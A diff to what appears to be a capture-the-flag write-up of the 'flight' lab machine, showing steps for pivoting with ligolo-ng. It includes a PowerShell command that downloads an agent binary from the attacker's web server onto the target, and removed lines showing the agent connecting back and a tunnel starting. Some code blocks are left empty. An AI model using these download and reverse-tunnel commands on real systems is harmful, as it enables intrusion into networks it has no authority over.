@@ -654,7 +654,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 Then ill setup a webserver to transfer the agent to the target
 
 ```python
-C:\Users\C.Bum\Documents>powershell -c wget http://10.10.14.90:8000/agent.exe -o agent.exe
+SHELL> powershell -c wget http://10.10.14.90:8000/agent.exe -o agent.exe
 ```
 This transferred it to the target
 
@@ -671,19 +671,12 @@ ligolo-ng »
 This has configured ligolo-ng routing info
 
 ```python
-C:\Users\C.Bum\Documents>agent.exe -connect 10.10.14.90:11601 --ignore-cert
-agent.exe -connect 10.10.14.90:11601 --ignore-cert
-time="2026-04-01T14:56:49-07:00" level=warning msg="warning, certificate validation disabled"
-time="2026-04-01T14:56:49-07:00" level=info msg="Connection established" addr="10.10.14.90:11601"
+
 ```
 This triggered a connection back to me
 
 ```python
-ligolo-ng » session
-? Specify a session : 1 - flight\C.Bum@g0 - 10.129.228.120:56529 - 00505694ba82
-[Agent : flight\C.Bum@g0] » tunnel_start --tun flight
-INFO[0300] Starting tunnel to flight\C.Bum@g0 (00505694ba82) 
-[Agent : flight\C.Bum@g0] » 
+ 
 ```
 This shows me getting the connection and starting the tunnel 
 
